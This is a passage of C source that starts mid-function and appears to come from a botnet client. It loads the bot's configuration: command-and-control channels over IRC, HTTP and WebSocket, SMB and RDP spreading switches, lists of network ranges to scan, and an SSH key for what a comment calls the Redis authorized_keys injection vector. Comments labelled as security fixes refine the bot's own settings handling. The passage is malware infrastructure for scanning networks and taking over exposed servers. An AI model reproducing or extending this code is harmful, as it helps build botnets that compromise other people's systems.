            bot->c2_ws.path[127] = '\0';
        } else if (strcmp(key, "ws_server") == 0) {
            strncpy(bot->c2_ws.server, value, 255);
            bot->c2_ws.server[255] = '\0';
        } else if (strcmp(key, "ws_port") == 0) {
            bot->c2_ws.port = atoi(value);
        } else if (strcmp(key, "smb_enabled") == 0) {
            bot->smb_enabled = atoi(value);
        } else if (strcmp(key, "redis_enabled") == 0) {
            bot->redis_enabled = atoi(value);
        } else if (strcmp(key, "redis_ssh_key") == 0) {
            /* SECURITY FIX (#72): Provisioned SSH key for the Redis
             * authorized_keys injection vector. Reject the old literal
             * placeholder. */
            if (strstr(value, "notnet-key") || strstr(value, "...")) {
                log_warn("Config: redis_ssh_key rejected (placeholder value)");
            } else {
                strncpy(bot->redis_ssh_key, value, sizeof(bot->redis_ssh_key) - 1);
                bot->redis_ssh_key[sizeof(bot->redis_ssh_key) - 1] = '\0';
            }
        } else if (strcmp(key, "rdp_enabled") == 0) {
            bot->rdp_enabled = atoi(value);
        /* SECURITY FIX (#82): Explicit <proto>_enabled keys. These take
         * precedence over port-based auto-detect — a non-default port
         * implies the protocol is wanted, but to disable a protocol while
         * keeping its default port, set <proto>_enabled=0. */
        } else if (strcmp(key, "irc_enabled") == 0) {
            irc_explicit = 1;
            if (atoi(value) != 0) bot->c2_enabled |= C2_IRC;
            else bot->c2_enabled &= ~C2_IRC;
        } else if (strcmp(key, "http_enabled") == 0) {
            http_explicit = 1;
            if (atoi(value) != 0) bot->c2_enabled |= C2_HTTP;
            else bot->c2_enabled &= ~C2_HTTP;
        } else if (strcmp(key, "ws_enabled") == 0) {
            ws_explicit = 1;
            if (atoi(value) != 0) bot->c2_enabled |= C2_WS;
            else bot->c2_enabled &= ~C2_WS;
        } else if (strcmp(key, "scan_targets") == 0) {
            /* README-documented format: scan_targets=192.168.1.0/24 */
            bot->scan_target_count = 0;
            char targets[512];
            strncpy(targets, value, sizeof(targets) - 1);
            targets[sizeof(targets) - 1] = '\0';
            char *saveptr = NULL;
            char *tok = strtok_r(targets, ",", &saveptr);
            while (tok && bot->scan_target_count < 16) {
                while (*tok == ' ' || *tok == '\t') tok++;
                if (*tok) {
                    strncpy(bot->scan_targets[bot->scan_target_count], tok, 255);
                    bot->scan_targets[bot->scan_target_count][255] = '\0';
                    bot->scan_target_count++;
                }
                tok = strtok_r(NULL, ",", &saveptr);
            }
        } else if (strncmp(key, "scan_target_", 12) == 0) {
            /* Legacy: scan_target_0, scan_target_1, etc. */
            int idx = atoi(key + 12);
            if (idx >= 0 && idx < 16 && bot->scan_target_count <= idx) {
                bot->scan_target_count = idx + 1;
                strncpy(bot->scan_targets[idx], value, 255);
                bot->scan_targets[idx][255] = '\0';
            }
        }
    }
    
    /* Auto-detect enabled protocols from config.
     * SECURITY FIX (#82): Port-based auto-detect only applies when no
     * explicit <proto>_enabled key was given. An explicit 0 must stick. */
    if (!irc_explicit && bot->c2_irc.port != IRC_DEFAULT_PORT) {
        bot->c2_enabled |= C2_IRC;
        log_info("C2: IRC enabled (%s:%d)", bot->c2_irc.server, bot->c2_irc.port);
    }
    if (!http_explicit && bot->c2_http.port != HTTP_DEFAULT_PORT) {
        bot->c2_enabled |= C2_HTTP;
        log_info("C2: HTTP enabled (%s:%d)", bot->c2_http.server, bot->c2_http.port);
    }
    if (!ws_explicit && bot->c2_ws.port != WS_DEFAULT_PORT) {
        bot->c2_enabled |= C2_WS;
        log_info("C2: WebSocket enabled (%s:%d)", bot->c2_ws.server, bot->c2_ws.port);
    }
    if (bot->c2_enabled == 0) {
        log_info("C2: no protocols enabled (use irc_server/http_server/http_port)");
    }
    
    fclose(f);
    log_info("Config loaded from %s", path);
    return 0;
}
